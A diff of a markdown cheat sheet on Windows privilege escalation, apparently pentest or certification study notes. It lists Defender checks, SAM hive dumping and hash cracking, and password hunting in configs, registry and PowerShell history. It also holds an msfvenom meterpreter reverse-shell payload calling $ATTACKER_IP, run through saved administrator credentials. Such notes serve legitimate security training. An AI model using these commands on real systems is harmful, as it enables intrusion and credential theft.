@@ -6,17 +6,17 @@
 | `Get-MpComputerStatus` | Checks if antivirus and Defender are on<br>```<br>RealTimeProtectionEnabled       : False<br>OnAccessProtectionEnabled       : False<br>BehaviorMonitorEnabled          : False<br>IoavProtectionEnabled           : False<br>```<br>- 🔹 These lines mean **Defender is not watching files in real time.**<br>- 🔹 You can likely **run tools, exploits, or scripts** without being blocked.<br>```bash<br>AntivirusEnabled                : True<br>AntivirusSignatureAge           : 1451<br>   AntivirusSignatureLastUpdated   : 8/7/2021<br>``` |
 | `Get-AppLockerPolicy`  | Shows what apps are allowed or blocked                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
 | `Test-AppLockerPolicy` | Tests if a file is allowed to run                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-### AppLocker Rules
+### <span style="color:#50FA7B">AppLocker Rules</span>
 ```powershell
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 ```
-his shows you AppLocker rules for different executable types:
+This shows you AppLocker rules for different executable types:
 - EXE and DLL
 - MSI and Script
 - Appx
 Look for **`Deny` rules** in the output.
 
-### System Enumeration
+### <span style="color:#50FA7B">System Enumeration</span>
 Basic System Info
 ```bash
 systeminfo                          # Detailed system config
@@ -39,12 +39,12 @@ View Folder Structure
 ```bash
 tree /f    # Shows files and directories recursively
 ```
-### Network Enumeration
+### <span style="color:#50FA7B">Network Enumeration</span>
 ```bash
 ipconfig /all           # All IP config info
 netstat -ano            # Active connections and listening ports
 ```
-# What service is listening on port 8080
+# <span style="color:#FF5555">What service is listening on port 8080</span>
 ```cmd
 netstat -ano | findstr :8080
 ```
@@ -53,24 +53,24 @@ Then take the PID (last column), and run:
 tasklist /FI "PID eq <pid_number>"
 ```
 That gives you the **executable name** (e.g., `java.exe`), then look up which **service** uses that executable.
-# Finding 
+# <span style="color:#FF5555">Finding</span>
 ```cmd
 dir /s /b C:\accesschk.exe
 ```
 This searches your `C:` drive for the file `accesschk.exe`.
 
-# What user is logged in to the target host?
+# <span style="color:#FF5555">What user is logged in to the target host?</span>
 ```cmd
 query user
 ```
 
-# How to check permissions
+# <span style="color:#FF5555">How to check permissions</span>
 
 ```cmd
 accesschk.exe \pipe\SQLLocal\SQLEXPRESS01 -v
 ```
 
-### Token Privilege Exploits
+### <span style="color:#50FA7B">Token Privilege Exploits</span>
 Check for SeImpersonatePrivilege
 
 ```bash
@@ -78,7 +78,7 @@ whoami /priv
 ```
 Juicy Potato, RoguePotato, or PrintSpoofer can be used if enabled.
 
-### Credential Dumping & Password Hunting
+### <span style="color:#50FA7B">Credential Dumping & Password Hunting</span>
  Registry Hive Dump (requires SYSTEM privileges)
 ```bash
 reg save HKLM\SAM SAM
@@ -94,14 +94,14 @@ samdump2 SYSTEM SAM    # Dumps NTLM hashes
 john --format=nt hash.txt --wordlist=rockyou.txt
 hashcat -m 1000 hash.txt rockyou.txt
 ```
-### Saved Windows Credentials
+### <span style="color:#50FA7B">Saved Windows Credentials</span>
 
 ```bash
 # List saved credentials:
 cmdkey /list
 
 # create a reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4747 -f exe -o oscpp.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4747 -f exe -o oscpp.exe
 
 # run the reverse
 runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe
@@ -111,11 +111,11 @@ runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrato
 ```
 
 
-### Look for Passwords in Configs and Registry
+### <span style="color:#50FA7B">Look for Passwords in Configs and Registry</span>
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
-### Sensitive File Discovery
+### <span style="color:#50FA7B">Sensitive File Discovery</span>
  Unattended Installation Files
 ```bash
 C:\Unattend.xml
@@ -132,7 +132,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 ```bash
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
-### PowerShell History
+### <span style="color:#50FA7B">PowerShell History</span>
 View PowerShell Command History
 ```bash
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -142,14 +142,14 @@ In PowerShell:
 Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-### Scheduled Tasks
+### <span style="color:#50FA7B">Scheduled Tasks</span>
 List and Investigate Tasks
 ```bash
 schtasks                      # List tasks
 schtasks /query /tn <name> /fo list /v   # Details of specific task
 icacls c:\tasks\schtask.bat   # Who can modify this task
 ```
-### Installed Software (Look for Vulnerabilities)
+### <span style="color:#50FA7B">Installed Software (Look for Vulnerabilities)</span>
 List Installed Software with Version
 ```bash
 wmic product get name,version,vendor
@@ -158,11 +158,11 @@ Use this info to:
 - Search for unpatched versions
 - Identify misconfigurations
 
-### PuTTY Saved Sessions (Possible Proxy Credentials)
+### <span style="color:#50FA7B">PuTTY Saved Sessions (Possible Proxy Credentials)</span>
 ```bash
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
-### Using Found Credentials to Gain Access
+### <span style="color:#50FA7B">Using Found Credentials to Gain Access</span>
 Use runas to switch user
 ```bash
 runas.exe /user:<username> cmd
